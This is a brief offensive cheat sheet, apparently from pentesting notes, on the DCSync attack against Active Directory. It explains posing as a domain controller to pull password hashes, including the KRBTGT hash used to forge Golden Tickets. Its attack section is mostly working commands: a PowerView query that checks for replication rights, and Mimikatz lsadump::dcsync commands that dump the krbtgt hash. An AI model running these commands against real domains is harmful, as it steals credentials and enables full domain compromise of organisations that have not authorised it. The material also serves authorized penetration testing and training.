# DCSync

## Brief

This attack simulates the behavior of a domain controller and asks other domain controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Basically, it lets you **pretend to be a domain controller** and ask for user password data. This can be used by attackers to get any account’s NTLM hash including the KRBTGT account, which enables attackers to create **Golden Tickets.**

The only pre-requisite to worry about is that you have an account with **rights** to perform **domain replication**. This is controlled by the Replicating Changes permissions set on the domain.

## Attack

### Check privileges

```powershell
Get-ObjectAcl -DistinguishedName "dc=fcorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}

# if OK :
# lsadump::dcsync /domain:[YOUR DOMAIN ALTOUGH NOT NECESSARY] /user:[ANY USER WHOS PASSWORD DETAILS YOU WANT]
# FOR EXAMPLE:
lsadump::dcsync /domain:fcorp.local /user:krbtgt

Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
# note : the user that has dcsync priv
```
